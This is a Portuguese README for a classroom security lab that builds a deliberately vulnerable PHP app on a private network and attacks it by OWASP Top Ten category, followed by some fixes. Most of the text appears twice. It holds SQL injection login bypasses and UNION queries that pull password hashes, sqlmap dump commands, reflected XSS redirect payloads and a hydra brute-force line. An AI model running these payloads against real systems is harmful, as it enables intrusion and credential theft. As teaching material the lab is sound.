# app-seguranca
repositório para teste de segurança,em aplicação PHP, utilizando kali linux
#####################################################################################################################################
# Cenário
#####################################################################################################################################

- Hosts e rede:
Baixar imagem kali: https://www.kali.org/get-kali/#kali-virtual-machines
opção virtualBox
1 - Kali: 1 interface NAT, 1 interface rede interna
  
    - Usuário/senha: kali/kali
    
    - Teclado ABNT2: setxkbmap -model abnt2 -layout br
    
    - Alternar para root: sudo su -
    
    - Rede:
  
  	nmcli connection modify "Wired connection 2" ipv4.method manual ipv4.addresses 192.168.10.1/24
	nmcli connection up "Wired connection 2"
	
2 - Linux CentOS: 1 interface NAT, 1 interface rede interna
Baixar image centos 9: https://www.linuxvmimages.com/images/centosstream-9/
opcao minumal installation

ROOT Password is linuxvmimages.com


  dnf install -y httpd mysql-server php php-mysqlnd
  
  sed -i "s/display_errors = Off/display_errors = On/g" /etc/php.ini

  systemctl --now enable httpd
  systemctl --now enable mysqld

  mysql_secure_installation
  	VALIDATE PASSWORD COMPONENT can be used to test passwords
	and improve security. It checks the strength of password
	and allows the users to set only those passwords which are
	secure enough. Would you like to setup VALIDATE PASSWORD component?
	
	selecionar opçao 0.

	Press y|Y for Yes, any other key for No: No
	Please set the password for root here.

	New password: p@ssw0rd
	Re-enter new password: p@ssw0rd
	Remove anonymous users? (Press y|Y for Yes, any other key for No): y
	Disallow root login remotely? (Press y|Y for Yes, any other key for No) : y
	Remove test database and access to it? (Press y|Y for Yes, any other key for No) : y
	Reload privilege tables now? (Press y|Y for Yes, any other key for No) : y

  firewall-cmd --permanent --add-service=http
  firewall-cmd --reload
  
  nmcli connection modify enp0s3 ipv4.method manual ipv4.addresses 192.168.10.2/24
  nmcli connection up id enp0s3

#################################################################################################################################################################
# CentOS: Banco de dados
#################################################################################################################################################################
```
  mysql -uroot -pp@ssw0rd -e 'drop database if exists exemplo'
  mysql -uroot -pp@ssw0rd -e 'create database exemplo character set utf8mb4'
  mysql -uroot -pp@ssw0rd exemplo -e 'create table cursos(codigo int not null auto_increment primary key, nome varchar(100), nivel varchar(15), duracao varchar(10), periodo varchar(10))'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into cursos(nome,nivel,duracao,periodo) values("Técnico em Informática","Técnico","2 anos","Vespertino")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into cursos(nome,nivel,duracao,periodo) values("Técnico em Administração","Técnico","2 anos","Vespertino")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into cursos(nome,nivel,duracao,periodo) values("Tecnologia em Análise e Desenvolvimento de Sistemas","Graduação","3 anos","Noturno")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into cursos(nome,nivel,duracao,periodo) values("Tecnologia em Processos Gerenciais","Graduação","2 anos","Noturno")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into cursos(nome,nivel,duracao,periodo) values("Especialização em Segurança da Informação","Pós-graduação","1 ano","Noturno")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into cursos(nome,nivel,duracao,periodo) values("Especialização em Gestão de Projetos","Pós-graduação","1 ano","Noturno")'  
  ```
  mysql -uroot -pp@ssw0rd exemplo -e 'create table usuarios (codigo int not null auto_increment primary key, usuario varchar(10), senha char(32), tipo char(1))'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into usuarios(usuario,senha,tipo) values("aluno",MD5("p@ssw0rd"),"A")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into usuarios(usuario,senha,tipo) values("professor",MD5("p@ssw0rd"),"P")'
```
  mysql -uroot -pp@ssw0rd exemplo -e 'create table confidencial (codigo int not null auto_increment primary key, conteudo varchar(50))'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into confidencial(conteudo) values("Conteúdo confidencial 1")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into confidencial(conteudo) values("Conteúdo confidencial 2")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into confidencial(conteudo) values("Conteúdo confidencial 3")'
```
  mysql -uroot -pp@ssw0rd exemplo -e 'select * from cursos'
  mysql -uroot -pp@ssw0rd exemplo -e 'select * from usuarios'
  mysql -uroot -pp@ssw0rd exemplo -e 'select * from confidencial'
```
#################################################################################################################################################################
# CentOS: Aplicação Web Vulnerável e SELinux
#################################################################################################################################################################

  Copiar arquivos da aplicação para /var/www/html/app
  
  semanage fcontext -a -t httpd_sys_content_t "/var/www/app(/.*)?"
  restorecon -Rv /var/www/html/app
  setsebool -P httpd_can_network_connect on

#################################################################################################################################################################
# OWASP Top Ten (https://owasp.org/www-project-top-ten/): A01:2021 - Broken Access Control (https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
#################################################################################################################################################################

Obs.: Acessos Web via navegador no Kali com usuários/senhas "aluno/p@ssw0rd" e "professor/p@ssw0rd"

  Após autenticado, alunos acessam o painel de professores e professores acessam o painel de alunos, modificando o URL
  	Painel de alunos: http://192.168.10.2/app/restrito/painel_alunos.php
  	Painel de professores: http://192.168.10.2/app/restrito/painel_professores.php
  
  Os conteúdos dos painéis de alunos e professores podem ser "lidos/acessados", mesmo sem autenticação
  	curl http://192.168.10.2/app/restrito/painel_alunos.php
  	curl http://192.168.10.2/app/restrito/painel_professores.php

Obs.: A descoberta de diretórios e arquivos pode ser realizada, por exemplo, via dirb
	dirb http://192.168.10.2/app
	dirb http://192.168.10.2/app/ /usr/share/wordlists/dirb/big.txt
	dirb http://192.168.10.2/app/ /usr/share/wordlists/dirb/big.txt -X .php

#################################################################################################################################################################
# OWASP Top Ten (https://owasp.org/www-project-top-ten/): A02:2021 - Cryptographic Failures (https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
#################################################################################################################################################################

  Hash de senhas utilizando MD5, sem salt (usuários com a mesma senha têm o mesmo hash)
	mysql -uroot -pp@ssw0rd exemplo -e 'select * from usuarios'
      
  Ausência de criptografia para dados confidenciais/sensíveis
	mysql -uroot -pp@ssw0rd exemplo -e 'select * from confidencial'

#################################################################################################################################################################
# OWASP Top Ten (https://owasp.org/www-project-top-ten/): A03:2021 - Injection (https://owasp.org/Top10/A03_2021-Injection/)
#################################################################################################################################################################

- SQL Injection (SQLi)

  http://192.168.10.2/app/restrito/login.php:
    Login com qualquer senha, via seguintes "usuários":
      aluno' -- (-- seguido de um espaço)
      professor' -- (-- seguido de um espaço)
      
Obs.: Os caracteres "--" (assim como "#", por exemplo) são utilizados para fins de comentário no MySQL. Detalhes em https://dev.mysql.com/doc/refman/8.0/en/comments.html
  
  http://192.168.10.2/app/publico/pesquisa.php:
  ```
    ?search=1'
    ?search=1'or 1='1
    ?search=-1' union select 1'
    ?search=-1' union select 1,2'
    ?search=-1' union select 1,2,3,4,5'
      - Outra abordagem comum: ORDER BY (?search=-1' order by 1 %23 ; ?search=-1' order by 2 %23 ; [...] ; ?search=-1' order by 6 %23, com erro indicando que não há a coluna 6 no exemplo)
    ?search=-1' union select 1,version(),3,4,5'
    ?search=-1' union select 1,user(),version(),4,5'
    ?search=-1' union select 1,user(),version(),database(),5'
    ?search=-1' union select 1,table_name,3,4,5 from information_schema.tables %23
    ?search=-1' union select 1,table_name,3,4,5 from information_schema.tables where table_schema="exemplo" %23
    	- Ou: -1' union select 1,table_name,3,4,5 from information_schema.tables where table_schema=database() %23
    ?search=-1' union select 1,column_name,3,4,5 from information_schema.columns where table_schema="exemplo" and table_name="usuarios" %23
    ?search=-1' union select 1,codigo,usuario,senha,tipo from usuarios %23
    ?search=-1' union select 1,concat(usuario,':',senha),3,4,5 from usuarios %23
```
Obs. 1: "%23" refere-se ao caractere "#" codificado (https://www.w3schools.com/tags/ref_urlencode.ASP), utilizado para comentário no MySQL (assim como "--", por exemplo). Para realização do SQLi via campo de pesquisa (em vez de modificações na URL), utilizar "#" em vez de "%23" (ex.: -1' union select 1,concat(usuario,':',senha),3,4,5 from usuarios #)

Obs. 2: Consultas equivalentes ("or" e "union"):
```
	mysql -uroot -pp@ssw0rd
	use exemplo;
	search=-1' union select 1,user(),version(),4,5';
	select * from cursos where nome like "%-1%" union select 1;
	select * from cursos where nome like "%-1%" union select 1,2;
	select * from cursos where nome like "%-1%" union select 1,2,3,4,5;
	select * from cursos where nome like "%-1%" union select 1,user(),3,4,5;
	select * from cursos where nome like "%-1%" union select 1,user(),version(),4,5;
	select * from cursos where nome like "%-1%" union select 1,user(),version(),database(),5;
	select * from cursos where nome like "%-1%" union select 1,table_name,3,4,5 from information_schema.tables;
	select * from cursos where nome like "%-1%" union select 1,table_name,3,4,5 from information_schema.tables where table_schema="exemplo";
	select * from cursos where nome like "%-1%" union select 1,column_name,3,4,5 from information_schema.columns where table_schema="exemplo" and table_name="usuarios";
	select * from cursos where nome like "%-1%" union select 1,codigo,usuario,senha,tipo from usuarios;
	select * from cursos where nome like "%-1%" union select 1,concat(usuario,':',senha),3,4,5 from usuarios;
   ``` 
  SQLi automatizado:
	sqlmap -h
	sqlmap -hh
	sqlmap -u "http://192.168.10.2/app/publico/pesquisa.php?search=1" --current-db
	sqlmap -u "http://192.168.10.2/app/publico/pesquisa.php?search=1" --users
	sqlmap -u "http://192.168.10.2/app/publico/pesquisa.php?search=1" -D exemplo --tables
	sqlmap -u "http://192.168.10.2/app/publico/pesquisa.php?search=1" -D exemplo -T usuarios --columns
	sqlmap -u "http://192.168.10.2/app/publico/pesquisa.php?search=1" -D exemplo -T usuarios -C 'usuario,senha' --dump
	sqlmap -u "http://192.168.10.2/app/restrito/login.php" --forms

- Cross-Site Scripting (XSS)

  http://192.168.10.2/app/restrito/login.php/"><script>alert("XSS")</script>
  http://192.168.10.2/app/restrito/login.php/"><script>window.location.href="https://suap.ifsp.edu.br/"</script>

  http://192.168.10.2/app/restrito/login.php/"><script>window.location.href="https://suap.ifsp.edu.br/"</script>
  http://192.168.10.2/app/publico/pesquisa.php/"><script>alert("Autentique-se para realizar a pesquisa");window.location.href="https://suap.ifsp.edu.br/"</script>
  http://192.168.10.2/app/publico/pesquisa.php, pesquisa por:
    
    <script>alert("XSS")</script>
    
    <script>alert("Autentique-se para realizar a pesquisa");window.location.href="https://suap.ifsp.edu.br/"</script>
    
    <br><br>
    <div class="row">
      <div class="column cl-100 column-content">
        <table id="tabela">
          <tr>
            <th>Nome</th>
            <th>Nível</th>
            <th>Duração</th>
            <th>Período</th>
          </tr>
          <tr>
            <td>Tecnologia em Assuntos Aleatórios</td>
            <td>Graduação</td>
            <td>2 anos</td>
            <td>Noturno</td>
          </tr>
          <tr>
            <td>Especialização em Assuntos Aleatórios</td>
            <td>Pós-graduação</td>
            <td>1 ano</td>
            <td>Noturno</td>
          </tr>
        </table>
      </div>
    </div>

#################################################################################################################################################################
# OWASP Top Ten (https://owasp.org/www-project-top-ten/): A07:2021 – Identification and Authentication Failures (https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
#################################################################################################################################################################

  Aplicação com senhas fracas (ex.: p@ssw0rd), sem proteção contra ataque de força bruta, empregando hash MD5 sem salt para senhas, etc.
    Força bruta:
      hydra -L /usr/share/wordlists/usuario-app.txt -P /usr/share/wordlists/senha-app.txt 192.168.10.2 http-post-form "/app/restrito/login.php:usuario=^USER^&senha=^PASS^&btnlogin=:Usuário e/ou senha inválidos"
    
    Obs.: Conteúdo dos arquivos usuarios e senhas de exemplo:
      usuarios:
        admin
        aluno
        professor
        
      senhas:
        123456
        qwerty
        p@ssw0rd
		

###conexão via ssh no Centos apartir do Kali
abrir terminal kali e executar "ssh aluno@192.168.10.2"
digitar senha "centos"
digitar "sudo su" para entrar como root
para verificar se esta conseguindo consultar o banco rodar:
  mysql -uroot -pp@ssw0rd exemplo -e 'select * from usuarios'


		
###Solução para restrigir buscar de diretorio "dirb"
editar aquivo "vim /etc/httpd/conf/httpd.conf"
onde estiver "Options Indexes FollowSymLinks" trocar para "Options FollowSymLinks"
restartar server apache: sudo service httpd restart

###Solução para XSS
editar aquivo "vim /etc/httpd/conf/httpd.conf"
incluindo os seguites comando no fim do arquivo:
	Header always set X-XSS-Protection: "1; mode=block"
	Header always set X-Content-Type-Options: "nosniff"
	Header always set X-Frame-Options: "SAMEORIGIN"
	Header always set Content-Security-Policy: "default-src 'self'"
	Header always set Referrer-Policy: "strict-origin-when-cross-origin"
	Header always set Strict-Transport-Security: "max-age=31536000; includeSubDomains; preload"

restartar server apache: sudo service httpd restart


###Copiar arquivos  via scp
criar uma portforward ssh no centos
configuracao>network>adapter 1 > create a portforward
digiaar
name: ssh
host port: 3322
guest port: 22

abrir terminal do computador local na pasta app
scp $(pwd)/* root@127.0.0.1:/var/www/html/

senha root: linuxvmimages.com

###solução para criptografia de senha
criado arquivo "atualiza_senha.php", onde captura os dados de usuario e atualiza a senha no banco 
utilizando o metodo "password_hash()"
alerado o login para consultar o usuario e verificar se a senha enviada depois de transformada em hash
é igual a gravado no banco, se sim loga, se não não permite logar

### atualizar senha aluno
curl --request POST \
  --url http://192.168.10.2/app/restrito/atualiza_senha.php \
  --header 'Content-Type: application/x-www-form-urlencoded' \
  --cookie PHPSESSID=gafu6aikp2m6b6q9pl3f916qs3 \
  --data "senha=batatado&usuario=aluno"
  
### atualizar senha professor
curl --request POST \
  --url http://192.168.10.2/app/restrito/atualiza_senha.php \
  --header 'Content-Type: application/x-www-form-urlencoded' \
  --cookie PHPSESSID=gafu6aikp2m6b6q9pl3f916qs3 \
  --data "senha=batatain&usuario=professor"



#####################################################################################################################################
# Cenário
#####################################################################################################################################

- Hosts e rede:
Baixar imagem kali: https://www.kali.org/get-kali/#kali-virtual-machines
opção virtualBox
1 - Kali: 1 interface NAT, 1 interface rede interna
  
    - Usuário/senha: kali/kali
    
    - Teclado ABNT2: setxkbmap -model abnt2 -layout br
    
    - Alternar para root: sudo su -
    
    - Rede:
  
  	nmcli connection modify "Wired connection 2" ipv4.method manual ipv4.addresses 192.168.10.1/24
	nmcli connection up "Wired connection 2"
	
2 - Linux CentOS: 1 interface NAT, 1 interface rede interna
Baixar image centos 9: https://www.linuxvmimages.com/images/centosstream-9/
opcao minumal installation

ROOT Password is linuxvmimages.com


  dnf install -y httpd mysql-server php php-mysqlnd
  
  sed -i "s/display_errors = Off/display_errors = On/g" /etc/php.ini

  systemctl --now enable httpd
  systemctl --now enable mysqld

  mysql_secure_installation
  	VALIDATE PASSWORD COMPONENT can be used to test passwords
	and improve security. It checks the strength of password
	and allows the users to set only those passwords which are
	secure enough. Would you like to setup VALIDATE PASSWORD component?
	
	selecionar opçao 0.

	Press y|Y for Yes, any other key for No: No
	Please set the password for root here.

	New password: p@ssw0rd
	Re-enter new password: p@ssw0rd
	Remove anonymous users? (Press y|Y for Yes, any other key for No): y
	Disallow root login remotely? (Press y|Y for Yes, any other key for No) : y
	Remove test database and access to it? (Press y|Y for Yes, any other key for No) : y
	Reload privilege tables now? (Press y|Y for Yes, any other key for No) : y

  firewall-cmd --permanent --add-service=http
  firewall-cmd --reload
  
  nmcli connection modify enp0s3 ipv4.method manual ipv4.addresses 192.168.10.2/24
  nmcli connection up id enp0s3

#################################################################################################################################################################
# CentOS: Banco de dados
#################################################################################################################################################################
```
  mysql -uroot -pp@ssw0rd -e 'drop database if exists exemplo'
  mysql -uroot -pp@ssw0rd -e 'create database exemplo character set utf8mb4'
  mysql -uroot -pp@ssw0rd exemplo -e 'create table cursos(codigo int not null auto_increment primary key, nome varchar(100), nivel varchar(15), duracao varchar(10), periodo varchar(10))'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into cursos(nome,nivel,duracao,periodo) values("Técnico em Informática","Técnico","2 anos","Vespertino")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into cursos(nome,nivel,duracao,periodo) values("Técnico em Administração","Técnico","2 anos","Vespertino")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into cursos(nome,nivel,duracao,periodo) values("Tecnologia em Análise e Desenvolvimento de Sistemas","Graduação","3 anos","Noturno")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into cursos(nome,nivel,duracao,periodo) values("Tecnologia em Processos Gerenciais","Graduação","2 anos","Noturno")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into cursos(nome,nivel,duracao,periodo) values("Especialização em Segurança da Informação","Pós-graduação","1 ano","Noturno")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into cursos(nome,nivel,duracao,periodo) values("Especialização em Gestão de Projetos","Pós-graduação","1 ano","Noturno")'  
  
  mysql -uroot -pp@ssw0rd exemplo -e 'create table usuarios (codigo int not null auto_increment primary key, usuario varchar(10), senha char(32), tipo char(1))'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into usuarios(usuario,senha,tipo) values("aluno",MD5("p@ssw0rd"),"A")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into usuarios(usuario,senha,tipo) values("professor",MD5("p@ssw0rd"),"P")'

  mysql -uroot -pp@ssw0rd exemplo -e 'create table confidencial (codigo int not null auto_increment primary key, conteudo varchar(50))'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into confidencial(conteudo) values("Conteúdo confidencial 1")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into confidencial(conteudo) values("Conteúdo confidencial 2")'
  mysql -uroot -pp@ssw0rd exemplo -e 'insert into confidencial(conteudo) values("Conteúdo confidencial 3")'

  mysql -uroot -pp@ssw0rd exemplo -e 'select * from cursos'
  mysql -uroot -pp@ssw0rd exemplo -e 'select * from usuarios'
  mysql -uroot -pp@ssw0rd exemplo -e 'select * from confidencial'
```
#################################################################################################################################################################
# CentOS: Aplicação Web Vulnerável e SELinux
#################################################################################################################################################################

  Copiar arquivos da aplicação para /var/www/html/app
  
  semanage fcontext -a -t httpd_sys_content_t "/var/www/app(/.*)?"
  restorecon -Rv /var/www/html/app
  setsebool -P httpd_can_network_connect on

#################################################################################################################################################################
# OWASP Top Ten (https://owasp.org/www-project-top-ten/): A01:2021 - Broken Access Control (https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
#################################################################################################################################################################

Obs.: Acessos Web via navegador no Kali com usuários/senhas "aluno/p@ssw0rd" e "professor/p@ssw0rd"

  Após autenticado, alunos acessam o painel de professores e professores acessam o painel de alunos, modificando o URL
  	Painel de alunos: http://192.168.10.2/app/restrito/painel_alunos.php
  	Painel de professores: http://192.168.10.2/app/restrito/painel_professores.php
  
  Os conteúdos dos painéis de alunos e professores podem ser "lidos/acessados", mesmo sem autenticação
  	curl http://192.168.10.2/app/restrito/painel_alunos.php
  	curl http://192.168.10.2/app/restrito/painel_professores.php

Obs.: A descoberta de diretórios e arquivos pode ser realizada, por exemplo, via dirb
	dirb http://192.168.10.2/app
	dirb http://192.168.10.2/app/ /usr/share/wordlists/dirb/big.txt
	dirb http://192.168.10.2/app/ /usr/share/wordlists/dirb/big.txt -X .php

#################################################################################################################################################################
# OWASP Top Ten (https://owasp.org/www-project-top-ten/): A02:2021 - Cryptographic Failures (https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
#################################################################################################################################################################

  Hash de senhas utilizando MD5, sem salt (usuários com a mesma senha têm o mesmo hash)
	mysql -uroot -pp@ssw0rd exemplo -e 'select * from usuarios'
      
  Ausência de criptografia para dados confidenciais/sensíveis
	mysql -uroot -pp@ssw0rd exemplo -e 'select * from confidencial'

#################################################################################################################################################################
# OWASP Top Ten (https://owasp.org/www-project-top-ten/): A03:2021 - Injection (https://owasp.org/Top10/A03_2021-Injection/)
#################################################################################################################################################################

- SQL Injection (SQLi)

  http://192.168.10.2/app/restrito/login.php:
    Login com qualquer senha, via seguintes "usuários":
      aluno' -- (-- seguido de um espaço)
      professor' -- (-- seguido de um espaço)
      
Obs.: Os caracteres "--" (assim como "#", por exemplo) são utilizados para fins de comentário no MySQL. Detalhes em https://dev.mysql.com/doc/refman/8.0/en/comments.html
  
  http://192.168.10.2/app/publico/pesquisa.php:
  ```
    ?search=1'
    ?search=1'or 1='1
    ?search=-1' union select 1'
    ?search=-1' union select 1,2'
    ?search=-1' union select 1,2,3,4,5'
      - Outra abordagem comum: ORDER BY (?search=-1' order by 1 %23 ; ?search=-1' order by 2 %23 ; [...] ; ?search=-1' order by 6 %23, com erro indicando que não há a coluna 6 no exemplo)
    ?search=-1' union select 1,version(),3,4,5'
    ?search=-1' union select 1,user(),version(),4,5'
    ?search=-1' union select 1,user(),version(),database(),5'
    ?search=-1' union select 1,table_name,3,4,5 from information_schema.tables %23
    ?search=-1' union select 1,table_name,3,4,5 from information_schema.tables where table_schema="exemplo" %23
    	- Ou: -1' union select 1,table_name,3,4,5 from information_schema.tables where table_schema=database() %23
    ?search=-1' union select 1,column_name,3,4,5 from information_schema.columns where table_schema="exemplo" and table_name="usuarios" %23
    ?search=-1' union select 1,codigo,usuario,senha,tipo from usuarios %23
    ?search=-1' union select 1,concat(usuario,':',senha),3,4,5 from usuarios %23
```
Obs. 1: "%23" refere-se ao caractere "#" codificado (https://www.w3schools.com/tags/ref_urlencode.ASP), utilizado para comentário no MySQL (assim como "--", por exemplo). Para realização do SQLi via campo de pesquisa (em vez de modificações na URL), utilizar "#" em vez de "%23" (ex.: -1' union select 1,concat(usuario,':',senha),3,4,5 from usuarios #)

Obs. 2: Consultas equivalentes ("or" e "union"):
```
	mysql -uroot -pp@ssw0rd
	use exemplo;
	search=-1' union select 1,user(),version(),4,5';
	select * from cursos where nome like "%-1%" union select 1;
	select * from cursos where nome like "%-1%" union select 1,2;
	select * from cursos where nome like "%-1%" union select 1,2,3,4,5;
	select * from cursos where nome like "%-1%" union select 1,user(),3,4,5;
	select * from cursos where nome like "%-1%" union select 1,user(),version(),4,5;
	select * from cursos where nome like "%-1%" union select 1,user(),version(),database(),5;
	select * from cursos where nome like "%-1%" union select 1,table_name,3,4,5 from information_schema.tables;
	select * from cursos where nome like "%-1%" union select 1,table_name,3,4,5 from information_schema.tables where table_schema="exemplo";
	select * from cursos where nome like "%-1%" union select 1,column_name,3,4,5 from information_schema.columns where table_schema="exemplo" and table_name="usuarios";
	select * from cursos where nome like "%-1%" union select 1,codigo,usuario,senha,tipo from usuarios;
	select * from cursos where nome like "%-1%" union select 1,concat(usuario,':',senha),3,4,5 from usuarios;
   ``` 
  SQLi automatizado:
  ```
	sqlmap -h
	sqlmap -hh
	sqlmap -u "http://192.168.10.2/app/publico/pesquisa.php?search=1" --current-db
	sqlmap -u "http://192.168.10.2/app/publico/pesquisa.php?search=1" --users
	sqlmap -u "http://192.168.10.2/app/publico/pesquisa.php?search=1" -D exemplo --tables
	sqlmap -u "http://192.168.10.2/app/publico/pesquisa.php?search=1" -D exemplo -T usuarios --columns
	sqlmap -u "http://192.168.10.2/app/publico/pesquisa.php?search=1" -D exemplo -T usuarios -C 'usuario,senha' --dump
	sqlmap -u "http://192.168.10.2/app/restrito/login.php" --forms
```
- Cross-Site Scripting (XSS)

  http://192.168.10.2/app/restrito/login.php/"><script>alert("XSS")</script>
  http://192.168.10.2/app/restrito/login.php/"><script>window.location.href="https://suap.ifsp.edu.br/"</script>

  http://192.168.10.2/app/restrito/login.php/"><script>window.location.href="https://suap.ifsp.edu.br/"</script>
  http://192.168.10.2/app/publico/pesquisa.php/"><script>alert("Autentique-se para realizar a pesquisa");window.location.href="https://suap.ifsp.edu.br/"</script>
  http://192.168.10.2/app/publico/pesquisa.php, pesquisa por:
    
    <script>alert("XSS")</script>
    
    <script>alert("Autentique-se para realizar a pesquisa");window.location.href="https://suap.ifsp.edu.br/"</script>
    
    <br><br>
    <div class="row">
      <div class="column cl-100 column-content">
        <table id="tabela">
          <tr>
            <th>Nome</th>
            <th>Nível</th>
            <th>Duração</th>
            <th>Período</th>
          </tr>
          <tr>
            <td>Tecnologia em Assuntos Aleatórios</td>
            <td>Graduação</td>
            <td>2 anos</td>
            <td>Noturno</td>
          </tr>
          <tr>
            <td>Especialização em Assuntos Aleatórios</td>
            <td>Pós-graduação</td>
            <td>1 ano</td>
            <td>Noturno</td>
          </tr>
        </table>
      </div>
    </div>

#################################################################################################################################################################
# OWASP Top Ten (https://owasp.org/www-project-top-ten/): A07:2021 – Identification and Authentication Failures (https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
#################################################################################################################################################################

  Aplicação com senhas fracas (ex.: p@ssw0rd), sem proteção contra ataque de força bruta, empregando hash MD5 sem salt para senhas, etc.
    Força bruta:
      hydra -L /usr/share/wordlists/usuario-app.txt -P /usr/share/wordlists/senha-app.txt 192.168.10.2 http-post-form "/app/restrito/login.php:usuario=^USER^&senha=^PASS^&btnlogin=:Usuário e/ou senha inválidos"
    
    Obs.: Conteúdo dos arquivos usuarios e senhas de exemplo:
      usuarios:
        admin
        aluno
        professor
        
      senhas:
        123456
        qwerty
        p@ssw0rd
		

###conexão via ssh no Centos apartir do Kali
abrir terminal kali e executar "ssh aluno@192.168.10.2"
digitar senha "centos"
digitar "sudo su" para entrar como root
para verificar se esta conseguindo consultar o banco rodar:
  mysql -uroot -pp@ssw0rd exemplo -e 'select * from usuarios'


		
###Solução para restrigir buscar de diretorio "dirb"
editar aquivo "vim /etc/httpd/conf/httpd.conf"
onde estiver "Options Indexes FollowSymLinks" trocar para "Options FollowSymLinks"
restartar server apache: sudo service httpd restart

###Solução para XSS
editar aquivo "vim /etc/httpd/conf/httpd.conf"
incluindo os seguites comando no fim do arquivo:
	Header always set X-XSS-Protection: "1; mode=block"
	Header always set X-Content-Type-Options: "nosniff"
	Header always set X-Frame-Options: "SAMEORIGIN"
	Header always set Content-Security-Policy: "default-src 'self'"
	Header always set Referrer-Policy: "strict-origin-when-cross-origin"
	Header always set Strict-Transport-Security: "max-age=31536000; includeSubDomains; preload"

restartar server apache: sudo service httpd restart


###Copiar arquivos  via scp
criar uma portforward ssh no centos
configuracao>network>adapter 1 > create a portforward
digiaar
name: ssh
host port: 3322
guest port: 22

abrir terminal do computador local na pasta app
scp $(pwd)/* root@127.0.0.1:/var/www/html/

senha root: linuxvmimages.com

###solução para criptografia de senha
criado arquivo "atualiza_senha.php", onde captura os dados de usuario e atualiza a senha no banco 
utilizando o metodo "password_hash()"
alerado o login para consultar o usuario e verificar se a senha enviada depois de transformada em hash
é igual a gravado no banco, se sim loga, se não não permite logar

### atualizar senha aluno
curl --request POST \
  --url http://192.168.10.2/app/restrito/atualiza_senha.php \
  --header 'Content-Type: application/x-www-form-urlencoded' \
  --cookie PHPSESSID=gafu6aikp2m6b6q9pl3f916qs3 \
  --data "senha=batatado&usuario=aluno"
  
### atualizar senha professor
curl --request POST \
  --url http://192.168.10.2/app/restrito/atualiza_senha.php \
  --header 'Content-Type: application/x-www-form-urlencoded' \
  --cookie PHPSESSID=gafu6aikp2m6b6q9pl3f916qs3 \
  --data "senha=batatain&usuario=professor"



